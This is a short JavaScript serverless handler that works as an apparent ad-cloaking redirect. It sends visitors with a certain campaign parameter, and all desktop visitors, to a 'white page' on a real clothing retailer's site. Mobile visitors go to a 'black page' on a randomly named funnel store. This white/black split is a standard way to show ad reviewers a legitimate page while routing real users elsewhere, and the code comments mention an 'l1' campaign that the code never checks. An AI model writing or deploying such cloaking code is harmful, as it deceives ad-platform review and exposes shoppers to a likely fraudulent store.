export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.hobbs.com/product/amanda-skinny-jeans/0223-8168-3817L00-BLACK.html#cgid=clothing-trousers&is=true&sz=60&start=0&isSecondPage=false&pid=0223-8168-3817L00-BLACK&pos=1";
    const blackPageURL = "https://xjsdiaoqpwepa.myfunnelish.com/chelsea-boden-boots";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
